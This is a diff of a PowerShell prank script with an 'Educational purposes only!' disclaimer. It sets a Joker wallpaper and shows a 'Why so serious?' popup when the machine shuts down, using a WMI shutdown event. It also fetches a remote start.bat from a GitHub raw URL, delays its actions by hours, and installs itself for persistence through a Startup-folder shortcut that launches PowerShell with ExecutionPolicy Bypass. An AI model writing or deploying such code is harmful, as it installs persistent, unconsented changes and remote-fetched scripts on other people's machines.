@@ -4,7 +4,7 @@ $scriptPath3 = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\noesu
 $batFilePath = "$env:userprofile\start.bat"
 $batchUrl = "https://raw.githubusercontent.com/notthecoolguyyouknow/WallpaperChanger/main/start.bat"
 
-$startDelayEnabled = $true # if true, it will do everything after the $delayHours
+$startDelayEnabled = $true
 $delayHours = 3
 
 function Get-ScriptPath {
@@ -27,7 +27,19 @@ if ($startDelayEnabled -eq $true) {
 
 $imagePath = "$env:userprofile\Pictures\background.jpg"
 $imageUrl = "https://i.kym-cdn.com/editorials/icons/mobile/000/009/963/evil_jonkler.jpg"
-Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath
+
+if (-not (Test-Path $imagePath)) {
+    Write-Host "Downloading image..."
+    Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath
+    if (Test-Path $imagePath) {
+        Write-Host "Image downloaded successfully."
+    } else {
+        Write-Host "Failed to download image."
+        exit
+    }
+} else {
+    Write-Host "Image already exists. Setting as wallpaper."
+}
 
 Add-Type -TypeDefinition @"
 using System;
@@ -44,13 +56,10 @@ function Show-ImageMessage {
     [System.Windows.MessageBox]::Show("Why so serious?", "System Notification", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Information)
 }
 
-try {
-    Register-WmiEvent -Query "SELECT * FROM Win32_ComputerShutdownEvent" -Action {
-        Show-ImageMessage
-    }
-} catch {
-    Write-Host "WMI not available in this environment."
+Register-WmiEvent -Query "SELECT * FROM Win32_ComputerShutdownEvent" -Action {
+    Show-ImageMessage
 }
+
 
 $startupShortcutPath = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\SetWallpaper.lnk"
 
@@ -60,10 +69,6 @@ if (-not (Test-Path $startupShortcutPath)) {
     $shortcut.TargetPath = "powershell.exe"
     $shortcut.Arguments = "-ExecutionPolicy Bypass -File `"$scriptPath`""
     $shortcut.Save()
-
-    if ($MyInvocation.MyCommand.Path -ne $scriptPath1) {
-        Copy-Item $MyInvocation.MyCommand.Path $scriptPath1
-    }
 }
 
 # Educational purposes only!
